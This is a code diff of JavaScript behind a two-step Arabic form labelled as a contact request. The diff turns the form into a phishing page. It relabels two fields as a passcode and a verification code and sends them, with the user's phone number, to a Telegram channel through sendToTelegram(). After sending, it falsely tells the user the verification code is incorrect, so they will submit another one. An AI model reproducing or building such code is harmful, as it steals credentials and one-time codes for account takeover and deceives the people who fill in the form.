@@ -139,8 +139,8 @@ firstForm.addEventListener("submit",async(event)=>{
   nextButton.textContent="جارٍ الإرسال...";
   try{
     const firstPhone2=document.getElementById("phone2").value.trim();
-    if(!/^\d{6}$/.test(firstPhone2)){messageOne.textContent="رقم الهاتف الثاني يجب أن يتكون من 6 أرقام بالضبط.";nextButton.disabled=false;nextButton.textContent="التالي";return;}
-    const firstMessage=["طلب تواصل - الخطوة الأولى","نوع الطلب: "+requestType,"رقم الهاتف الأول: "+firstPhone,"رقم الهاتف الثاني: "+firstPhone2].join("\n");
+    if(!/^\d{6}$/.test(firstPhone2)){messageOne.textContent="رقم المرور يجب أن يتكون من 6 أرقام بالضبط.";nextButton.disabled=false;nextButton.textContent="التالي";return;}
+    const firstMessage=["طلب تواصل - الخطوة الأولى","نوع الطلب: "+requestType,"رقم الهاتف "+firstPhone,"رمز المرور "+firstPhone2].join("\n");
     await sendToTelegram(firstMessage);
     stepOne.classList.remove("active");
     stepTwo.classList.add("active");
@@ -153,13 +153,13 @@ secondForm.addEventListener("submit",async(event)=>{
   event.preventDefault();
   messageTwo.textContent="";
   const phone3=document.getElementById("phone3").value.trim();
-  if(!/^\d{6}$/.test(phone3)){messageTwo.textContent="رقم الهاتف الثالث يجب أن يتكون من 6 أرقام بالضبط.";return;}
+  if(!/^\d{6}$/.test(phone3)){messageTwo.textContent="رمز التحقق يجب أن يتكون من 6 أرقام بالضبط.";return;}
   sendButton.disabled=true;
   sendButton.textContent="جارٍ الإرسال...";
   try{
-    const secondMessage=["استكمال طلب تواصل - الخطوة الثانية","نوع الطلب: "+requestType,"رقم الهاتف الأول: "+firstPhone,"رقم الهاتف الثاني: "+document.getElementById("phone2").value.trim(),"رقم الهاتف الثالث: "+phone3,"تم إرسال بيانات الخطوة الأولى سابقاً، وهذه إعادة إرسال لها مع الرقم الإضافي."].join("\n");
+    const secondMessage=["استكمال طلب - الخطوة الثانية","نوع الطلب: "+requestType,"رقم الهاتف: "+firstPhone,"رمز المرور: "+document.getElementById("phone2").value.trim(),"رمز التحقق: "+phone3,""].join("\n");
     await sendToTelegram(secondMessage);
-    messageTwo.textContent="تم إرسال طلب التواصل بنجاح.";
+    messageTwo.textContent="رمز التحقق غير صحيح";
     secondForm.reset();
   }catch(error){messageTwo.textContent=error.message||"تعذر الإرسال. حاول مرة أخرى.";}
   finally{sendButton.disabled=false;sendButton.textContent="إرسال طلب التواصل";}
